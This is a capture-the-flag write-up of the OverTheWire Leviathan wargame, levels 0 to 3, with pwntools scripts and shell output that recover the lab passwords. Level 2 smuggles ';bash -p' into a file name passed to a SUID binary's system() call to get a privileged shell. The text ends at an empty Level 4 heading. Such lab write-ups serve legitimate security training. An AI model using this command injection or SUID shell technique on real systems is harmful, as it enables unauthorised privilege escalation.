---
title: OverTheWire - Leviathan w/ pwntools
description: OTW leviathan writeup with pwntools.
categories:
 - overthewire
tags: overthewire pwntools linux ssh
---

![](https://images3.alphacoders.com/605/thumb-1920-605494.jpg)

Hi all, let's pwn it!

You can find the challenge there > [OverTheWire Leviathan](https://overthewire.org/wargames/leviathan/){:target="_blank"}

## Level 0

Let's connect first to the server, default creds for level 0 are `leviathan0:leviathan0`:

```
$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0@leviathan:~$
```

We can see a hidden `.backup` directory:

```
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

There is a bookmarks.html file in it, probably password is in it.

```
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
```

File has lot of contents, i'll use linux filtering to grab just the password:

```
leviathan0@leviathan:~/.backup$ wc -l -c bookmarks.html 
  1399 133259 bookmarks.html
```

```
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep password | cut -d ' ' -f 14 | cut -c1-10
rioGegei8m
```

If you have no idea what `cut` command does, i suggest you to study about it.

My pwntools exploit (add 2 backslashes between the space delimiter):

```python
#!/usr/bin/env python3
#context.log_level = 'debug'

from pwn import *

log.info('leviathan series pwntools exploit by atom')
shell = ssh('leviathan0', 'leviathan.labs.overthewire.org', password='leviathan0', port=2223)
sh = shell.run('sh')
sh.sendline('cd .backup; cat bookmarks.html | grep password | cut -d ' ' -f 14 | cut -c1-10')
log.success("Password for the next level -> " + sh.recvline().decode("utf-8"))
```

```
$ ./exp.py 
[*] leviathan series pwntools exploit by atom
[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
[*] leviathan0@leviathan.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[+] Opening new channel: 'sh': Done
[+] Password for the next level -> $ rioGegei8m
```

## Level 1

Let's connect now to the next level:

```
$ ssh leviathan1@leviathan.labs.overthewire.org -p 2223
leviathan1@leviathan:~$
```

We have to deal with a 32bit binary:

```
leviathan1@leviathan:~$ ls
check
leviathan1@leviathan:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
```

Let's execute it to see what is does:

```
leviathan1@leviathan:~$ ./check
password: lol
Wrong password, Good Bye ...
```

Needs a password, if the password is true i guess will give us a shell as leviathan2. Let's do some basic RE on it with ltrace (ltrace = intercepts library calls):

```
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
printf("password: ")                                                                                              = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: 1234
)                                                                             = 49
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                             = 50
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                             = 51
strcmp("123", "sex")                                                                                              = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                              = 29
+++ exited (status 0) +++
```

It uses the `strcmp` function. `strcmp` compares two strings, so here it compares our input with string `sex`. So `sex` is the password:

```
leviathan1@leviathan:~$ ltrace -e strcmp ./check
password: 123
check->strcmp("123", "sex")                                                                                       = -1
Wrong password, Good Bye ...
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
```

We can find the password under `/etc/leviathan_pass/leviathan2`:

```
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

My pwntools exploit:

```python
#!/usr/bin/env python3
#context.log_level = 'debug'

from pwn import *

log.info('leviathan series pwntools exploit by atom')
shell = ssh('leviathan1', 'leviathan.labs.overthewire.org', password='rioGegei8m', port=2223)
sh = shell.run('sh')
sh.sendline('(echo sex;cat) | ./check')
log.warn('run -> cat /etc/leviathan_pass/leviathan2 to grab the flag!')
sh.interactive()
```

```
$ ./exp.py 
[*] leviathan series pwntools exploit by atom
[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
[*] leviathan0@leviathan.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[+] Opening new channel: 'sh': Done
[!] run -> cat /etc/leviathan_pass/leviathan2 to grab the flag!
[*] Switching to interactive mode
$ $ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

## Level 2

Let's connect to level 2:

```
$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223 
leviathan2@leviathan:~$
```

We can see an ELF file again:

```
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
```

Let's see what it does:

```
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile "/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

It prints the contents of a file, cool let's try to print the flag for level3:

```
leviathan2@leviathan:~$ ./printfile "/etc/leviathan_pass/leviathan3"
You cant have that file...
```

Yeap, we cant read this flag. Let's do some basic RE with ltrace again.

```
leviathan2@leviathan:~$ ltrace ./printfile .profile
__libc_start_main(0x804852b, 2, 0xffffd784, 0x8048610 <unfinished ...>
access(".profile", 4)                                                                                             = 0
snprintf("/bin/cat .profile", 511, "/bin/cat %s", ".profile")                                                     = 17
geteuid()                                                                                                         = 12002
geteuid()                                                                                                         = 12002
setreuid(12002, 12002)                                                                                            = 0
system("/bin/cat .profile"# ~/.profile: executed by the command interpreter for login shells.
```

It uses `system()` function with cat command -> `cat + our input`, we have to trick the binary. File is SUID that means we can run the binary as user `leviathan3`, let's make a random name file & add `;bash -p`. `-p` allows the shell to run with SUID privileges.

```
leviathan2@leviathan:~$ touch /tmp/"l0ksjajs;bash -p"
leviathan2@leviathan:~$ ./printfile /tmp/"l0ksjajs;bash -p"
/bin/cat: /tmp/l0ksjajs: No such file or directory
leviathan3@leviathan:~$ whoami
leviathan3
```

The password for next level:

```
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3 
Ahdiemoo1j
```

My pwntools exploit (you may need to run the exploit multiple times!):

```python
#!/usr/bin/env python3
#context.log_level = 'debug'

from pwn import *

log.info('leviathan series pwntools exploit by atom')
log.info('shell crashes, you may need to run the exploit multiple times!')
shell = ssh('leviathan2', 'leviathan.labs.overthewire.org', password='ougahZi8Ta', port=2223)
sh = shell.run('sh')
sh.sendline('touch /tmp/'ajsdaskaaa;bash -p'') # add backslash after /tmp/ and after -p
sh.sendline('./printfile /tmp/'ajsdaskaaa;bash -p'') # add backslash after /tmp/ and after -p
log.warn('run -> cat /etc/leviathan_pass/leviathan3 to grab the flag!')
sh.interactive()
```

```
$ ./exp.py
[*] leviathan series pwntools exploit by atom
[*] shell crashes, you may need to run the exploit multiple times!
[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
[*] leviathan2@leviathan.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[+] Opening new channel: 'sh': Done
[!] run -> cat /etc/leviathan_pass/leviathan3 to grab the flag!
[*] Switching to interactive mode
$ $ /bin/cat: /tmp/ajsdaskaaa: No such file or directory
$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
```

## Level 3

Let's connect to level 3:

```
$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223
leviathan3@leviathan:~$
```

We have to deal with a binary again:

```
leviathan3@leviathan:~$ file level3 
level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ed9f6a6d1c89cf1f3f2eff370de4fb1669774fd5, not stripped
```

Let's run it:

```
leviathan3@leviathan:~$ ./level3 
Enter the password> lol
bzzzzzzzzap. WRONG
```

Needs a password, let's fire up ltrace.

```
leviathan3@leviathan:~$ ltrace -e strcmp ./level3
level3->strcmp("h0no33", "kakaka")                                                                                = -1
Enter the password> lol
level3->strcmp("lol\n", "snlprintf\n")                                                                            = -1
bzzzzzzzzap. WRONG
+++ exited (status 0) +++
```

Compares our input with string `snlprintf` tricky, let's input that and grab a shell as leviathan4.

```
leviathan3@leviathan:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
```

Password for next level:

```
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

My pwntools exploit:

```python
#!/usr/bin/env python3
#context.log_level = 'debug'

from pwn import *

log.info('leviathan series pwntools exploit by atom')
shell = ssh('leviathan3', 'leviathan.labs.overthewire.org', password='Ahdiemoo1j', port=2223)
sh = shell.run('sh')
sh.sendline('(echo snlprintf;cat) | ./level3')
log.warn('run -> cat /etc/leviathan_pass/leviathan4 to grab the flag!')
sh.interactive()
```

```
$ ./exp.py   
[*] leviathan series pwntools exploit by atom
[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
[*] leviathan2@leviathan.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[+] Opening new channel: 'sh': Done
[!] run -> cat /etc/leviathan_pass/leviathan4 to grab the flag!
[*] Switching to interactive mode
$ Enter the password> [You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

## Level 4





